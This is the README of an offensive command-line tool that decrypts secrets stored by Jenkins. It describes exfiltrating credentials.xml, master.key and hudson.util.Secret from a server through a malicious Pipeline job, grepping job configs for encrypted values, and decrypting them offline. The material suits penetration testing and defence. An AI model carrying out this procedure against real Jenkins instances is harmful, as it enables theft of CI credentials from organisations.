# jenkins-decryptor

Install with [pipx](https://github.com/pypa/pipx).

~~~ bash
pipx install git+https://github.com/dadevel/jenkins-decryptor.git@main
~~~

Exfiltrate following files from Jenkins (typically `/var/lib/jenkins` or `/var/jenkins_home`):

- `$JENKINS_HOME/credentials.xml`
- `$JENKINS_HOME/secrets/hudson.util.Secret`
- `$JENKINS_HOME/secrets/master.key`

For example by creating a new *Pipeline* project with a *Pipeline script* based on this [Jenkinsfile](./extras/Jenkinsfile).
Then you can retrieve the files from the *Console output*.

Then decrypt the secrets offline.

~~~ bash
jenkins-decyptor ./master.key ./hudson.util.Secret ./credentials.xml
~~~

In some cases file credentials (*FileCredentialsImpl* in XML) are not decrypted correctly.
See this [Jenkinsfile](./extras/Jenkinsfile) for how to retrieve them online.

Search for additional credentials in user and job configs.

~~~ bash
grep --color=auto --include=build.xml --include=config.xml -r -E -o '>\{[a-zA-Z0-9+/=]{4,}\}<' "$JENKINS_HOME" > ./jenkins.txt
~~~

And decrypt them as well.

~~~ bash
jenkins-decyptor ./master.key ./hudson.util.Secret ./jenkins.txt
~~~

References:

- [github.com/gquere/pwn_jenkins](https://github.com/gquere/pwn_jenkins)
